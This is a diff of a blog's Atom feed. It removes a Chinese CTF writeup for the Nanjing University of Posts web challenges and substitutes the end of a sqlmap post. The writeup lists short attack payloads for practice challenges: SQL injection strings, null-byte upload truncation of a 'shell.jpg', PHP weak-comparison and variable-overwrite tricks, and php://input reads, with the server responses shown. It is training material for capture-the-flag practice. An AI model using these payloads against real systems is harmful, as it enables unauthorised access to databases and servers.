-&lt;h2 id=&quot;14gbk-injection&quot;&gt;14.GBK Injection&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://pengyang.me/2018/08/17/slmap1/&quot;&gt;https://pengyang.me/2018/08/17/slmap1/&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;15x00&quot;&gt;15./x00&lt;/h2&gt;
-
-&lt;p&gt;我开始直接用 &lt;code class=&quot;highlighter-rouge&quot;&gt;%00&lt;/code&gt;截断的时候没有成功，然后换了一种方法&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?nctf[]=1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;后来发现&lt;code class=&quot;highlighter-rouge&quot;&gt;#&lt;/code&gt;需要编码&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nctf=1%00%23biubiubiu
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;16-bypass-again&quot;&gt;16. bypass again&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?a=QNKCDZO&amp;amp;b=240610708
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;17变量覆盖&quot;&gt;17.变量覆盖&lt;/h2&gt;
-
-&lt;p&gt;extract变量覆盖，POST &lt;code class=&quot;highlighter-rouge&quot;&gt;pass=&amp;amp;thepassword_123=&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;18php是世界上最好的语言&quot;&gt;18.PHP是世界上最好的语言&lt;/h2&gt;
-
-&lt;font color=&quot;red&quot;&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;
-
-&lt;h2 id=&quot;19伪装者&quot;&gt;19.伪装者&lt;/h2&gt;
-
-&lt;p&gt;XFF&lt;/p&gt;
-
-&lt;p&gt;我一眼看上去就知道是 XFF，但是居然试了很多次都没有成功，别人也是这样做的就成功了，&lt;strong&gt;可能题目坏掉了。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;20header&quot;&gt;20.Header&lt;/h2&gt;
-
-&lt;font color=&quot;red&quot;&gt; 貌似是题目坏掉了，题目无法访问&lt;/font&gt;
-
-&lt;h2 id=&quot;21上传绕过&quot;&gt;21.上传绕过&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----------------------------8005181633237170861136986551
-Content-Disposition: form-data; name=&quot;dir&quot;
-
-/uploads/test.php+空格   ---&amp;gt; hex:&quot;20&quot;-&quot;00&quot;
------------------------------8005181633237170861136986551
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.jpg&quot;
-Content-Type: text/php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;分析:&lt;/p&gt;
-
-&lt;p&gt;step1:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/uploads/test.php
------------------------------8005181633237170861136986551
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.jpg &quot;
-Content-Type: text/php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;回显&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Array
-(
-    [0] =&amp;gt; .jpg
-    [1] =&amp;gt; jpg
-)
-Upload: shell.jpg&amp;lt;br /&amp;gt;Type: text/php&amp;lt;br /&amp;gt;Size: 0.2861328125 Kb&amp;lt;br /&amp;gt;Sto&quot;red&quot; in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
-  [&quot;dirname&quot;]=&amp;gt;
-  string(9) &quot;./uploads&quot;
-  [&quot;basename&quot;]=&amp;gt;
-  string(17) &quot;test.phpshell.jpg&quot;
-  [&quot;extension&quot;]=&amp;gt;
-  string(3) &quot;jpg&quot;
-  [&quot;filename&quot;]=&amp;gt;
-  string(13) &quot;test.phpshell&quot;
-}
-&amp;lt;br&amp;gt;必须上传成后缀名为php的文件才行啊！&amp;lt;br&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;step2: 使用 payload&lt;/p&gt;
-
-&lt;p&gt;回显&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Array
-(
-    [0] =&amp;gt; .jpg
-    [1] =&amp;gt; jpg
-)
-Upload: shell.jpg&amp;lt;br /&amp;gt;Type: text/php&amp;lt;br /&amp;gt;Size: 0.2861328125 Kb&amp;lt;br /&amp;gt;Sto&quot;red&quot; in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
-  [&quot;dirname&quot;]=&amp;gt;
-  string(9) &quot;./uploads&quot;
-  [&quot;basename&quot;]=&amp;gt;
-  string(8) &quot;test.php&quot;
-  [&quot;extension&quot;]=&amp;gt;
-  string(3) &quot;php&quot;
-  [&quot;filename&quot;]=&amp;gt;
-  string(4) &quot;test&quot;
-}
-&amp;lt;br&amp;gt;恭喜你获得flag一枚：&amp;lt;br&amp;gt;flag:nctf{welcome_to_hacks_world}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;通过回显内容的对比可以看到，这里截断就是要截断&lt;code class=&quot;highlighter-rouge&quot;&gt;test.phpshell.jpg&lt;/code&gt;从而绕过后台的验证。&lt;/p&gt;
-
-&lt;h2 id=&quot;22sql注入1&quot;&gt;22.SQL注入1&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user=admin')#&amp;amp;pass=1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;23pass-check&quot;&gt;23.pass check&lt;/h2&gt;
-
-&lt;p&gt;POST: &lt;code class=&quot;highlighter-rouge&quot;&gt;pass[]=1&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;24起名字真难&quot;&gt;24.起名字真难&lt;/h2&gt;
-
-&lt;p&gt;PHP 中弱类型比较&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xccccccccc
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;25密码重置&quot;&gt;25.密码重置&lt;/h2&gt;
-
-&lt;font color=&quot;red&quot;&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;
-
-&lt;h2 id=&quot;26php-反序列化暂时无法做&quot;&gt;26.php 反序列化(暂时无法做)&lt;/h2&gt;
-
-&lt;p&gt;暂时无法做&lt;/p&gt;
-
-&lt;h2 id=&quot;27sql-injection&quot;&gt;27.SQL Injection&lt;/h2&gt;
-
-&lt;p&gt;发现sql查选语句使用了分号，对于此种类型的sql注入就必须要闭合其中的分号。由于使用了htmlentities()函数，所以无法使用分号了。此时就可以使用反斜杠来通过转义的方式来吞掉一个分号。注入的payload为：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://chinalover.sinaapp.com/web15/index.php?username=admin\&amp;amp;password= or 1%23
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;那么最后的查询语句就会变为：&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * FROM users WHERE name='admin\'AND pass=' or 1#'&lt;/code&gt;这样就得到了flag了。 遇到了带有引号的sql查选，就是要逃脱单引号，要么就是生成一个单引号，要么就是省略掉一个单引号。在本题中由于没有屏蔽反斜线，就可以使用反斜线来去掉一个单引号。&lt;/p&gt;
-
-&lt;h2 id=&quot;28综合题&quot;&gt;28.综合题&lt;/h2&gt;
-
-&lt;p&gt;JSFuck&lt;br /&gt;
-tip: history of bash&lt;br /&gt;
-bash 的历史记录存放在 .bash_histroy 这个隐藏文件里，访问  &lt;code class=&quot;highlighter-rouge&quot;&gt;http://.../.bash_histroy&lt;/code&gt;。再下载对应文件即可。&lt;/p&gt;
-
-&lt;h2 id=&quot;29system暂时无法做&quot;&gt;29.system（暂时无法做）&lt;/h2&gt;
-
-&lt;p&gt;暂时无法做&lt;/p&gt;
-
-&lt;h2 id=&quot;30sql注入2&quot;&gt;30.SQL注入2&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user=' union select md5(1)#&amp;amp;pass=1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;31综合题2&quot;&gt;31.综合题2&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://pengyang.me/2018/08/19/nctfzh2/&quot;&gt;https://pengyang.me/2018/08/19/nctfzh2/&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;32密码重置2&quot;&gt;32.密码重置2&lt;/h2&gt;
-
-&lt;font color=&quot;red&quot;&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;
-
-&lt;h2 id=&quot;33file_get_contents&quot;&gt;33.file_get_contents&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /web23/?file=php://input HTTP/1.1
-
-meizijiu
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;34变量覆盖&quot;&gt;34.变量覆盖&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /web24/?name=meizijiu233 HTTP/1.1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;35hateit&quot;&gt;35.HateIT&lt;/h2&gt;
-
-&lt;h2 id=&quot;36anonymous&quot;&gt;36.Anonymous&lt;/h2&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;$MY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;create_function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;die(`cat flag.php`);&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin2hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;openssl_random_pseudo_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;function SUCTF_&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;(){&quot;&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;global &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;MY;&quot;&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;MY();&quot;&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'func_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;func_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]();&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;show_source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">这篇是南邮 CTF web 题目的 writeup，写在这里作为记录。持续更新……</summary></entry></feed>
+乌云知识库还有几篇不错的文章&lt;/p&gt;</content><author><name>Catcher</name></author><category term="sqlmap" /><summary type="html">抛开场景来谈应用都是在瞎扯，在这里我就打算记录一下各个场景下 sqlmap 的使用。</summary></entry></feed>
